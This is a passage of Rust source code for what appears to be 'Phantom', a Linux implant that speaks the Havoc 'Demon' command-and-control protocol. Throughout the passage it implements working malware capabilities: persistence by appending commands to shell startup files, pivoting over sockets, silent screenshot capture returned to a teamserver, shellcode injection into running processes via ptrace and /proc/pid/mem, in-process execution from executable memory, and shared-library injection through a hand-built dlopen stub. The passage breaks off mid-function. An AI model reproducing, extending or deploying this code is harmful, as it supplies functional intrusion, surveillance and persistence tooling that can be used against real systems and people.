    let mut not_found = Vec::new();

    for path in &targets {
        let existing = if path.exists() {
            fs::read_to_string(path).map_err(|e| format!("read {}: {e}", path.display()))?
        } else {
            String::new()
        };

        match op {
            PhantomPersistOp::Install => {
                if existing.contains(&begin_marker) {
                    already_present.push(path.display().to_string());
                    continue;
                }
                let block = format!("\n{begin_marker}\n{command}\n{end_marker}\n");
                let new_content = format!("{existing}{block}");
                fs::write(path, new_content)
                    .map_err(|e| format!("write {}: {e}", path.display()))?;
                touched.push(path.display().to_string());
            }
            PhantomPersistOp::Remove => {
                if !existing.contains(&begin_marker) {
                    not_found.push(path.display().to_string());
                    continue;
                }
                let new_content = remove_shell_rc_block(&existing, &begin_marker, &end_marker);
                fs::write(path, new_content)
                    .map_err(|e| format!("write {}: {e}", path.display()))?;
                touched.push(path.display().to_string());
            }
        }
    }

    let summary = match op {
        PhantomPersistOp::Install => {
            let mut parts = Vec::new();
            if !touched.is_empty() {
                parts.push(format!("installed in: {}", touched.join(", ")));
            }
            if !already_present.is_empty() {
                parts.push(format!("already present in: {}", already_present.join(", ")));
            }
            parts.join("; ")
        }
        PhantomPersistOp::Remove => {
            let mut parts = Vec::new();
            if !touched.is_empty() {
                parts.push(format!("removed from: {}", touched.join(", ")));
            }
            if !not_found.is_empty() {
                parts.push(format!("not found in: {}", not_found.join(", ")));
            }
            parts.join("; ")
        }
    };

    Ok(format!("shell rc persistence: {summary}"))
}

/// Remove the `BEGIN … END` block from `text`, returning the modified string.
fn remove_shell_rc_block(text: &str, begin: &str, end: &str) -> String {
    let mut result = String::with_capacity(text.len());
    let mut inside = false;

    for line in text.lines() {
        if line.trim() == begin {
            inside = true;
            continue;
        }
        if inside {
            if line.trim() == end {
                inside = false;
            }
            continue;
        }
        result.push_str(line);
        result.push('\n');
    }

    result
}

/// Handle `CommandPackageDropped` (ID 2570): a previously queued packet was
/// dropped (e.g. exceeded the SMB pipe buffer limit).
///
/// The payload carries two u32 values:
/// - `dropped_package_length` — size of the dropped package in bytes.
/// - `max_length` — the maximum allowed buffer size.
///
/// Any in-flight download whose `request_id` matches the dropped package is
/// marked for removal so the agent does not keep trying to send chunks for a
/// transfer the teamserver will never complete.
fn execute_package_dropped(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let dropped_length = parser.int32()? as u32;
    let max_length = parser.int32()? as u32;

    tracing::warn!(
        request_id,
        dropped_length,
        max_length,
        "package dropped — cleaning up in-flight state"
    );

    // Mark any active download associated with this request as removed so
    // `push_download_chunks` will close it on the next poll cycle.
    for download in &mut state.downloads {
        if download.request_id == request_id {
            download.state = DownloadTransferState::Remove;
        }
    }

    state.queue_callback(PendingCallback::Error {
        request_id,
        text: format!("package dropped: size {dropped_length} exceeds max {max_length}"),
    });

    Ok(())
}

/// Handle `CommandConfig` (ID 2500): reconfigure live agent parameters.
///
/// The payload starts with a config key (u32) followed by key-specific data.
/// For Linux-relevant keys the value is applied and echoed back as a
/// [`PendingCallback::Structured`] response.  Windows-only keys are rejected
/// with an error callback.
fn execute_config(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let raw_key = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative config key"))?;

    let key = match DemonConfigKey::try_from(raw_key) {
        Ok(key) => key,
        Err(_) => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: format!("unknown config key {raw_key}"),
            });
            return Ok(());
        }
    };

    match key {
        DemonConfigKey::KillDate => {
            let kill_date = parser.int64()?;
            state.kill_date = if kill_date > 0 { Some(kill_date) } else { None };

            let mut response = encode_u32(raw_key);
            response.extend_from_slice(&encode_u64(u64::try_from(kill_date).unwrap_or_default()));
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandConfig),
                request_id,
                payload: response,
            });
        }
        DemonConfigKey::WorkingHours => {
            let hours = parser.int32()?;
            let hours_u32 = u32::try_from(hours)
                .map_err(|_| PhantomError::TaskParse("negative working hours value"))?;
            state.working_hours = if hours_u32 != 0 {
                Some(
                    i32::try_from(hours_u32)
                        .map_err(|_| PhantomError::TaskParse("working hours overflow"))?,
                )
            } else {
                None
            };

            let mut response = encode_u32(raw_key);
            response.extend_from_slice(&encode_u32(hours_u32));
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandConfig),
                request_id,
                payload: response,
            });
        }
        // Windows-only configuration keys — not applicable to Linux.
        DemonConfigKey::ImplantSpfThreadStart
        | DemonConfigKey::ImplantVerbose
        | DemonConfigKey::ImplantSleepTechnique
        | DemonConfigKey::ImplantCoffeeThreaded
        | DemonConfigKey::ImplantCoffeeVeh
        | DemonConfigKey::MemoryAlloc
        | DemonConfigKey::MemoryExecute
        | DemonConfigKey::InjectTechnique
        | DemonConfigKey::InjectSpoofAddr
        | DemonConfigKey::InjectSpawn64
        | DemonConfigKey::InjectSpawn32 => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: format!("config key {key:?} is not supported on Linux"),
            });
        }
    }

    Ok(())
}

/// Handle `CommandPivot` (ID 2520) — SMB pivot chain management.
///
/// On Linux, Phantom uses Unix domain sockets as the local transport for pivot
/// chains instead of Windows named pipes.  The subcommand wire format is
/// identical to the Demon agent so that the teamserver can parse callbacks
/// without special-casing.
fn execute_pivot(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let raw_sub = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative pivot subcommand"))?;

    let subcommand = match DemonPivotCommand::try_from(raw_sub) {
        Ok(sub) => sub,
        Err(_) => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: format!("unknown pivot subcommand {raw_sub}"),
            });
            return Ok(());
        }
    };

    match subcommand {
        DemonPivotCommand::List => {
            let mut response = encode_u32(u32::from(DemonPivotCommand::List));
            for (&demon_id, pivot) in &state.smb_pivots {
                response.extend_from_slice(&encode_u32(demon_id));
                response.extend_from_slice(
                    &encode_utf16(&pivot.pipe_name)
                        .map_err(|_| PhantomError::TaskParse("pivot pipe name encode"))?,
                );
            }
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandPivot),
                request_id,
                payload: response,
            });
        }

        DemonPivotCommand::SmbConnect => {
            let pipe_name = parser.wstring()?;
            let mut response = encode_u32(u32::from(DemonPivotCommand::SmbConnect));

            match pivot_connect(&pipe_name) {
                Ok((stream, init_data, agent_id)) => {
                    state.smb_pivots.insert(agent_id, PivotConnection { pipe_name, stream });
                    response.extend_from_slice(&encode_bool(true));
                    response.extend_from_slice(&encode_bytes_result(&init_data));
                }
                Err(message) => {
                    response.extend_from_slice(&encode_bool(false));
                    // Error code — use 0 as a generic "connection failed".
                    response.extend_from_slice(&encode_u32(0));
                    state.queue_callback(PendingCallback::Error {
                        request_id,
                        text: format!("[SMB] pivot connect failed: {message}"),
                    });
                    state.queue_callback(PendingCallback::Structured {
                        command_id: u32::from(DemonCommand::CommandPivot),
                        request_id,
                        payload: response,
                    });
                    return Ok(());
                }
            }

            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandPivot),
                request_id,
                payload: response,
            });
        }

        DemonPivotCommand::SmbDisconnect => {
            let agent_id = parser.int32()? as u32;
            let removed = state.smb_pivots.remove(&agent_id).is_some();

            let mut response = encode_u32(u32::from(DemonPivotCommand::SmbDisconnect));
            response.extend_from_slice(&encode_bool(removed));
            response.extend_from_slice(&encode_u32(agent_id));
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandPivot),
                request_id,
                payload: response,
            });
        }

        DemonPivotCommand::SmbCommand => {
            let agent_id = parser.int32()? as u32;
            let data = parser.bytes()?;

            if let Some(pivot) = state.smb_pivots.get_mut(&agent_id) {
                if let Err(e) = pivot_write_raw(&mut pivot.stream, data) {
                    state.queue_callback(PendingCallback::Error {
                        request_id,
                        text: format!("[SMB] pivot write to {agent_id:08x} failed: {e}"),
                    });
                }
            } else {
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("[SMB] pivot {agent_id:08x} not found"),
                });
            }
            // SmbCommand does not send a structured response (matches Demon behaviour).
        }
    }

    Ok(())
}

/// Handle `CommandScreenshot` (ID 2510): capture the Linux desktop.
///
/// Tries several capture methods in order of preference:
/// 1. `import -window root png:-` (ImageMagick)
/// 2. `scrot -o -` (scrot)
/// 3. `gnome-screenshot -f <tmpfile>` (GNOME)
/// 4. `xwd -root -silent` piped through `convert xwd:- png:-`
///
/// On success, sends a [`PendingCallback::Structured`] containing
/// `[success:u32=1][image_bytes:len-prefixed]`.  On failure, sends
/// `[success:u32=0]`.
async fn execute_screenshot(request_id: u32, state: &mut PhantomState) -> Result<(), PhantomError> {
    match capture_screenshot().await {
        Ok(image_bytes) => {
            let mut payload = encode_u32(1); // success = TRUE
            payload.extend_from_slice(&encode_bytes(&image_bytes)?);
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandScreenshot),
                request_id,
                payload,
            });
        }
        Err(error) => {
            tracing::warn!(%error, "screenshot capture failed");
            let payload = encode_u32(0); // success = FALSE
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandScreenshot),
                request_id,
                payload,
            });
        }
    }

    Ok(())
}

/// Attempt to capture a screenshot using available Linux tools.
///
/// Returns the raw PNG image bytes on success.
async fn capture_screenshot() -> Result<Vec<u8>, PhantomError> {
    // Method 1: ImageMagick `import`
    if let Ok(output) = Command::new("import")
        .args(["-window", "root", "png:-"])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .await
    {
        if output.status.success() && !output.stdout.is_empty() {
            tracing::debug!("screenshot captured via import (ImageMagick)");
            return Ok(output.stdout);
        }
    }

    // Method 2: scrot
    if let Ok(output) = Command::new("scrot")
        .args(["-o", "-"])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .await
    {
        if output.status.success() && !output.stdout.is_empty() {
            tracing::debug!("screenshot captured via scrot");
            return Ok(output.stdout);
        }
    }

    // Method 3: gnome-screenshot to a temp file
    let tmp_path = "/tmp/.phantom_screenshot.png";
    if let Ok(output) = Command::new("gnome-screenshot")
        .args(["-f", tmp_path])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()
        .await
    {
        if output.status.success() {
            if let Ok(data) = fs::read(tmp_path) {
                let _ = fs::remove_file(tmp_path);
                if !data.is_empty() {
                    tracing::debug!("screenshot captured via gnome-screenshot");
                    return Ok(data);
                }
            }
        }
    }
    let _ = fs::remove_file(tmp_path);

    // Method 4: xwd captured then piped through ImageMagick convert
    if let Ok(xwd_output) = Command::new("xwd")
        .args(["-root", "-silent"])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .await
    {
        if xwd_output.status.success() && !xwd_output.stdout.is_empty() {
            if let Ok(mut convert_child) = Command::new("convert")
                .args(["xwd:-", "png:-"])
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::null())
                .spawn()
            {
                // Write xwd data to convert's stdin, then collect output.
                if let Some(mut stdin) = convert_child.stdin.take() {
                    use tokio::io::AsyncWriteExt;
                    let _ = stdin.write_all(&xwd_output.stdout).await;
                    drop(stdin);
                    if let Ok(convert_output) = convert_child.wait_with_output().await {
                        if convert_output.status.success() && !convert_output.stdout.is_empty() {
                            tracing::debug!("screenshot captured via xwd + convert");
                            return Ok(convert_output.stdout);
                        }
                    }
                } else {
                    let _ = convert_child.wait().await;
                }
            }
        }
    }

    Err(PhantomError::Screenshot(
        "no screenshot tool available (tried import, scrot, gnome-screenshot, xwd+convert)"
            .to_owned(),
    ))
}

// ---------------------------------------------------------------------------
// Process injection constants (match Demon protocol)
// ---------------------------------------------------------------------------

/// Injection way: spawn a new sacrificial process and inject into it.
const INJECT_WAY_SPAWN: i32 = 0;
/// Injection way: inject into an existing process by PID.
const INJECT_WAY_INJECT: i32 = 1;
/// Injection way: execute in the current process.
const INJECT_WAY_EXECUTE: i32 = 2;

/// Injection result: success.
const INJECT_ERROR_SUCCESS: u32 = 0;
/// Injection result: generic failure.
const INJECT_ERROR_FAILED: u32 = 1;

// ---------------------------------------------------------------------------
// CommandInjectShellcode (ID 24)
// ---------------------------------------------------------------------------

/// Handle `CommandInjectShellcode` (ID 24): inject raw shellcode into a process.
///
/// ## Packet format (from teamserver, little-endian)
///
/// | Field      | Type   | Description                                      |
/// |------------|--------|--------------------------------------------------|
/// | way        | i32    | 0 = spawn, 1 = inject (by PID), 2 = execute self |
/// | technique  | i32    | Thread creation method (ignored on Linux)         |
/// | x64        | i32    | Architecture flag (ignored on Linux)              |
/// | shellcode  | bytes  | `[len:i32][data]` — the shellcode payload         |
/// | argument   | bytes  | `[len:i32][data]` — optional arguments            |
/// | pid        | i32    | Target PID (only meaningful for way=1)            |
///
/// ## Response (big-endian)
///
/// `[status:u32]` — 0 = success, 1 = failure.
async fn execute_inject_shellcode(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let way = parser.int32()?;
    let _technique = parser.int32()?; // Windows thread creation method — ignored on Linux
    let _x64 = parser.int32()?; // Architecture flag — ignored on Linux (native arch)
    let shellcode = parser.bytes()?.to_vec();
    let _argument = parser.bytes()?.to_vec();
    let pid = parser.int32().unwrap_or(0); // PID may be absent for spawn/execute

    tracing::debug!(way, shellcode_len = shellcode.len(), pid, "inject shellcode");

    let status = match way {
        INJECT_WAY_INJECT => inject_shellcode_into_pid(pid as u32, &shellcode).await,
        INJECT_WAY_SPAWN => inject_shellcode_spawn(&shellcode).await,
        INJECT_WAY_EXECUTE => inject_shellcode_execute(&shellcode),
        _ => {
            tracing::warn!(way, "unknown injection way");
            INJECT_ERROR_FAILED
        }
    };

    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandInjectShellcode),
        request_id,
        payload: encode_u32(status),
    });

    Ok(())
}

/// Inject shellcode into an existing process using `/proc/<pid>/mem`.
///
/// 1. Attach via `ptrace(PTRACE_ATTACH)`.
/// 2. Read the current RIP from registers.
/// 3. Write shellcode at RIP via `/proc/<pid>/mem`.
/// 4. Detach with `ptrace(PTRACE_DETACH)` so the tracee resumes at the
///    overwritten instruction pointer.
async fn inject_shellcode_into_pid(pid: u32, shellcode: &[u8]) -> u32 {
    use std::io::{Seek, SeekFrom};

    if shellcode.is_empty() {
        tracing::warn!("empty shellcode payload");
        return INJECT_ERROR_FAILED;
    }

    let pid_i32 = pid as i32;

    // PTRACE_ATTACH
    // SAFETY: ptrace with PTRACE_ATTACH on a valid PID. We check the return value.
    let ret = unsafe { libc::ptrace(libc::PTRACE_ATTACH, pid_i32, 0, 0) };
    if ret < 0 {
        tracing::warn!(pid, "ptrace ATTACH failed: {}", std::io::Error::last_os_error());
        return INJECT_ERROR_FAILED;
    }

    // Wait for the tracee to stop.
    let mut wait_status: i32 = 0;
    // SAFETY: waitpid with valid PID and status pointer.
    unsafe { libc::waitpid(pid_i32, &mut wait_status, 0) };

    // Read registers to find RIP (instruction pointer).
    let mut regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
    // SAFETY: PTRACE_GETREGS with valid pid and pointer to regs struct.
    let ret = unsafe {
        libc::ptrace(libc::PTRACE_GETREGS, pid_i32, 0, &mut regs as *mut libc::user_regs_struct)
    };
    if ret < 0 {
        tracing::warn!(pid, "ptrace GETREGS failed: {}", std::io::Error::last_os_error());
        // SAFETY: detach from the tracee to avoid leaving it stopped.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    let inject_addr = regs.rip;

    // Write shellcode via /proc/<pid>/mem at the current RIP.
    let mem_path = format!("/proc/{pid}/mem");
    let result = (|| -> std::io::Result<()> {
        let mut file = fs::OpenOptions::new().write(true).open(&mem_path)?;
        file.seek(SeekFrom::Start(inject_addr))?;
        file.write_all(shellcode)?;
        Ok(())
    })();

    if let Err(e) = result {
        tracing::warn!(pid, %e, "failed to write shellcode via /proc/pid/mem");
        // SAFETY: detach from the tracee.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // Detach — the tracee resumes execution at the (now overwritten) RIP.
    // SAFETY: PTRACE_DETACH with valid pid.
    unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };

    tracing::info!(pid, inject_addr, shellcode_len = shellcode.len(), "shellcode injected");
    INJECT_ERROR_SUCCESS
}

/// Spawn a sacrificial child process and inject shellcode into it.
///
/// Forks a child that immediately stops itself (`SIGSTOP`), then uses the
/// same `/proc/<pid>/mem` technique to overwrite its entry point with the
/// shellcode before resuming it.
async fn inject_shellcode_spawn(shellcode: &[u8]) -> u32 {
    if shellcode.is_empty() {
        tracing::warn!("empty shellcode payload");
        return INJECT_ERROR_FAILED;
    }

    // Spawn a stopped child via `sleep infinity` — we'll overwrite it before it runs.
    let child = match Command::new("/bin/sh")
        .args(["-c", "kill -STOP $$ ; exec sleep infinity"])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            tracing::warn!(%e, "failed to spawn sacrificial process");
            return INJECT_ERROR_FAILED;
        }
    };

    let Some(child_pid) = child.id() else {
        tracing::warn!("failed to get child PID");
        return INJECT_ERROR_FAILED;
    };

    // Brief pause to let the child reach the SIGSTOP.
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    // Inject using the same ptrace path.
    inject_shellcode_into_pid(child_pid, shellcode).await
}

/// Execute shellcode in the current process using an anonymous mmap region.
///
/// Allocates RWX memory via `mmap`, copies the shellcode, and calls it as a
/// function pointer on a new thread (so the agent main thread is not blocked).
fn inject_shellcode_execute(shellcode: &[u8]) -> u32 {
    if shellcode.is_empty() {
        tracing::warn!("empty shellcode payload");
        return INJECT_ERROR_FAILED;
    }

    let len = shellcode.len();

    // SAFETY: mmap with MAP_ANONYMOUS | MAP_PRIVATE, no file descriptor.
    let addr = unsafe {
        libc::mmap(
            std::ptr::null_mut(),
            len,
            libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
            libc::MAP_ANONYMOUS | libc::MAP_PRIVATE,
            -1,
            0,
        )
    };
    if addr == libc::MAP_FAILED {
        tracing::warn!("mmap failed: {}", std::io::Error::last_os_error());
        return INJECT_ERROR_FAILED;
    }

    // SAFETY: addr is a valid mmap'd region of `len` bytes.
    unsafe {
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, len);
    }

    // Execute on a background thread so the agent doesn't block.
    let func_ptr = addr as usize;
    let map_len = len;
    std::thread::spawn(move || {
        // SAFETY: the caller guarantees the shellcode is valid executable code.
        // This is an intentional code-execution primitive.
        unsafe {
            let func: extern "C" fn() = std::mem::transmute(func_ptr);
            func();
            // Best-effort unmap after the shellcode returns (it may never return).
            libc::munmap(func_ptr as *mut libc::c_void, map_len);
        }
    });

    tracing::info!(shellcode_len = len, "shellcode executing in-process");
    INJECT_ERROR_SUCCESS
}

// ---------------------------------------------------------------------------
// CommandInjectDll (ID 22)
// ---------------------------------------------------------------------------

/// Handle `CommandInjectDll` (ID 22): inject a shared library into a running process.
///
/// ## Packet format (from teamserver, little-endian)
///
/// | Field          | Type   | Description                              |
/// |----------------|--------|------------------------------------------|
/// | technique      | i32    | Injection technique (ignored on Linux)   |
/// | target_pid     | i32    | Target process ID                        |
/// | dll_ldr        | bytes  | Reflective loader (ignored on Linux)     |
/// | dll_bytes      | bytes  | The shared library (.so) binary          |
/// | parameter      | bytes  | Optional parameter string for the .so    |
///
/// On Linux the reflective loader is not used.  Instead the .so bytes are
/// written to a `memfd_create` file descriptor, and `dlopen` is invoked on
/// the target process via ptrace to load `/proc/<pid>/fd/<memfd>`.
///
/// ## Response
///
/// `[status:u32]` — 0 = success, 1 = failure.
async fn execute_inject_dll(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let _technique = parser.int32()?;
    let target_pid = parser.int32()?;
    let _dll_ldr = parser.bytes()?; // Reflective loader — not used on Linux
    let dll_bytes = parser.bytes()?.to_vec();
    let _parameter = parser.bytes()?.to_vec();

    tracing::debug!(target_pid, dll_size = dll_bytes.len(), "inject dll/so into process");

    let status = inject_so_into_pid(target_pid as u32, &dll_bytes).await;

    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandInjectDll),
        request_id,
        payload: encode_u32(status),
    });

    Ok(())
}

/// Inject a shared library into a target process.
///
/// 1. Write the .so bytes to a memfd (`memfd_create`).
/// 2. Attach to the target via ptrace.
/// 3. Use `/proc/<target>/mem` to write a small dlopen-calling stub at the
///    current RIP, with the memfd path as argument.
/// 4. Detach and let the target resume.
///
/// This is a simplified approach — for a production-grade implementation the
/// stub would call `__libc_dlopen_mode` at the resolved address.  Here we
/// take a pragmatic shortcut: write the .so to `/dev/shm`, then use the
/// shellcode-injection path with a tiny stub that calls `dlopen`.
async fn inject_so_into_pid(pid: u32, so_bytes: &[u8]) -> u32 {
    if so_bytes.is_empty() {
        tracing::warn!("empty .so payload");
        return INJECT_ERROR_FAILED;
    }

    // Write the .so to a temporary file in /dev/shm (tmpfs, memory-backed).
    let so_path = format!("/dev/shm/.phantom_{pid}_{}.so", std::process::id());
    if let Err(e) = fs::write(&so_path, so_bytes) {
        tracing::warn!(%e, "failed to write .so to /dev/shm");
        return INJECT_ERROR_FAILED;
    }

    // Make it executable.
    if let Err(e) =
        fs::set_permissions(&so_path, std::os::unix::fs::PermissionsExt::from_mode(0o755))
    {
        tracing::warn!(%e, "failed to chmod .so");
        let _ = fs::remove_file(&so_path);
        return INJECT_ERROR_FAILED;
    }

    // Build a minimal x86_64 shellcode stub that calls dlopen(path, RTLD_NOW).
    //
    // The stub layout:
    //   call dlopen_resolve   ; resolve dlopen address from libc
    //   ... path string ...
    //
    // For simplicity we use the ptrace + /proc/pid/mem approach: we find the
    // address of `__libc_dlopen_mode` in the target's memory, then write a
    // stub that calls it with our .so path.
    let status = inject_so_via_ptrace(pid, &so_path).await;

    // Clean up the .so file after a short delay (give dlopen time to map it).
    let so_path_clone = so_path.clone();
    tokio::spawn(async move {
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
        let _ = fs::remove_file(&so_path_clone);
    });

    status
}

/// Use ptrace to make a target process call `dlopen` on a shared library path.
///
/// Strategy:
/// 1. Attach via ptrace.
/// 2. Find the base address of libc in the target via `/proc/<pid>/maps`.
/// 3. Find `__libc_dlopen_mode` offset by scanning our own libc.
/// 4. Write the .so path string and a `call dlopen; int3` stub into the
///    target's stack region.
/// 5. Set RIP to the stub and resume.
/// 6. Wait for the `int3` trap, restore original registers, detach.
async fn inject_so_via_ptrace(pid: u32, so_path: &str) -> u32 {
    let pid_i32 = pid as i32;

    // PTRACE_ATTACH
    // SAFETY: ptrace with valid PID. Return value checked.
    let ret = unsafe { libc::ptrace(libc::PTRACE_ATTACH, pid_i32, 0, 0) };
    if ret < 0 {
        tracing::warn!(pid, "ptrace ATTACH failed: {}", std::io::Error::last_os_error());
        return INJECT_ERROR_FAILED;
    }

    let mut wait_status: i32 = 0;
    // SAFETY: waitpid with valid PID.
    unsafe { libc::waitpid(pid_i32, &mut wait_status, 0) };

    // Find libc base in the target process.
    let target_libc_base = match find_libc_base(pid) {
        Some(base) => base,
        None => {
            tracing::warn!(pid, "could not find libc base in target");
            // SAFETY: detach.
            unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
            return INJECT_ERROR_FAILED;
        }
    };

    // Find __libc_dlopen_mode offset in our own libc, then compute target address.
    let dlopen_addr = match resolve_dlopen_in_target(target_libc_base) {
        Some(addr) => addr,
        None => {
            tracing::warn!(pid, "could not resolve __libc_dlopen_mode");
            // SAFETY: detach.
            unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
            return INJECT_ERROR_FAILED;
        }
    };

    // Save original registers.
    let mut orig_regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
    // SAFETY: PTRACE_GETREGS with valid pid.
    let ret = unsafe {
        libc::ptrace(
            libc::PTRACE_GETREGS,
            pid_i32,
            0,
            &mut orig_regs as *mut libc::user_regs_struct,
        )
    };
    if ret < 0 {
        tracing::warn!(pid, "ptrace GETREGS failed: {}", std::io::Error::last_os_error());
        // SAFETY: detach.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // We'll write the path string and a small stub on the stack (below RSP).
    // Layout (growing downward):
    //   RSP - 256: path string (null-terminated)
    //   RSP - 128: stub code
    let path_addr = orig_regs.rsp.wrapping_sub(256);
    let stub_addr = orig_regs.rsp.wrapping_sub(128);

    // Write the .so path string at path_addr.
    let mut path_bytes = so_path.as_bytes().to_vec();
    path_bytes.push(0); // null terminator
    let write_result = write_to_proc_mem(pid, path_addr, &path_bytes);
    if write_result.is_err() {
        tracing::warn!(pid, "failed to write path to target memory");
        // SAFETY: detach.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // Build x86_64 stub:
    //   lea rdi, [rip + path_addr]   ; path (we'll use absolute mov instead)
    //   mov rsi, RTLD_NOW (2)
    //   mov rax, dlopen_addr
    //   call rax
    //   int3                          ; trap so we can restore
    let mut stub: Vec<u8> = Vec::new();
    // mov rdi, path_addr (movabs)
    stub.extend_from_slice(&[0x48, 0xbf]);
    stub.extend_from_slice(&path_addr.to_le_bytes());
    // mov rsi, 2 (RTLD_NOW)
    stub.extend_from_slice(&[0x48, 0xbe]);
    stub.extend_from_slice(&2_u64.to_le_bytes());
    // mov rax, dlopen_addr
    stub.extend_from_slice(&[0x48, 0xb8]);
    stub.extend_from_slice(&dlopen_addr.to_le_bytes());
    // call rax
    stub.extend_from_slice(&[0xff, 0xd0]);
    // int3
    stub.push(0xcc);

    let write_result = write_to_proc_mem(pid, stub_addr, &stub);
    if write_result.is_err() {
        tracing::warn!(pid, "failed to write stub to target memory");
        // SAFETY: detach.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // Set RIP to the stub and align RSP.
    let mut new_regs = orig_regs;
    new_regs.rip = stub_addr;
    // Ensure stack is 16-byte aligned for the call.
    new_regs.rsp = orig_regs.rsp.wrapping_sub(512) & !0xf;

    // SAFETY: PTRACE_SETREGS with valid pid.
    let ret = unsafe {
        libc::ptrace(libc::PTRACE_SETREGS, pid_i32, 0, &new_regs as *const libc::user_regs_struct)
    };
    if ret < 0 {
        tracing::warn!(pid, "ptrace SETREGS failed: {}", std::io::Error::last_os_error());
        // SAFETY: detach.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // Resume the target.
    // SAFETY: PTRACE_CONT with valid pid.
    unsafe { libc::ptrace(libc::PTRACE_CONT, pid_i32, 0, 0) };

    // Wait for int3 trap (SIGTRAP).
    let mut trap_status: i32 = 0;
    // SAFETY: waitpid with valid pid.
    unsafe { libc::waitpid(pid_i32, &mut trap_status, 0) };

    // Restore original registers.
    // SAFETY: PTRACE_SETREGS with valid pid and original register state.
    unsafe {
        libc::ptrace(libc::PTRACE_SETREGS, pid_i32, 0, &orig_regs as *const libc::user_regs_struct)
    };

    // Detach.
    // SAFETY: PTRACE_DETACH with valid pid.
    unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };

    tracing::info!(pid, so_path, "shared library injected via ptrace");
    INJECT_ERROR_SUCCESS
}

/// Write data to a target process's memory via `/proc/<pid>/mem`.
fn write_to_proc_mem(pid: u32, addr: u64, data: &[u8]) -> std::io::Result<()> {
    use std::io::{Seek, SeekFrom};

    let mem_path = format!("/proc/{pid}/mem");
    let mut file = fs::OpenOptions::new().write(true).open(mem_path)?;
    file.seek(SeekFrom::Start(addr))?;
    file.write_all(data)?;
    Ok(())
}

/// Find the base address of libc in a target process by parsing `/proc/<pid>/maps`.
fn find_libc_base(pid: u32) -> Option<u64> {
    let maps = fs::read_to_string(format!("/proc/{pid}/maps")).ok()?;
    for line in maps.lines() {
        if (line.contains("libc.so") || line.contains("libc-")) && line.contains("r-xp") {
            let addr_str = line.split('-').next()?;
            return u64::from_str_radix(addr_str, 16).ok();
        }
    }
    None
}

/// Resolve the address of `__libc_dlopen_mode` in the target process.
///
/// We find the offset in our own libc and combine it with the target's libc
/// base address. This works because both processes load the same libc version
/// (same system).
fn resolve_dlopen_in_target(target_libc_base: u64) -> Option<u64> {
    // Find our own libc base.
    let our_libc_base = find_libc_base(std::process::id())?;

    // Resolve __libc_dlopen_mode in our own process.
    let sym_name = std::ffi::CString::new("__libc_dlopen_mode").ok()?;
    // SAFETY: dlsym with RTLD_DEFAULT to search all loaded libraries.
    let sym_addr = unsafe { libc::dlsym(libc::RTLD_DEFAULT, sym_name.as_ptr()) };
    if sym_addr.is_null() {
        // Fall back to dlopen as a symbol name.
        let sym_name2 = std::ffi::CString::new("dlopen").ok()?;
        // SAFETY: dlsym with RTLD_DEFAULT.
        let sym_addr2 = unsafe { libc::dlsym(libc::RTLD_DEFAULT, sym_name2.as_ptr()) };
        if sym_addr2.is_null() {
            return None;
        }
        let offset = (sym_addr2 as u64).wrapping_sub(our_libc_base);
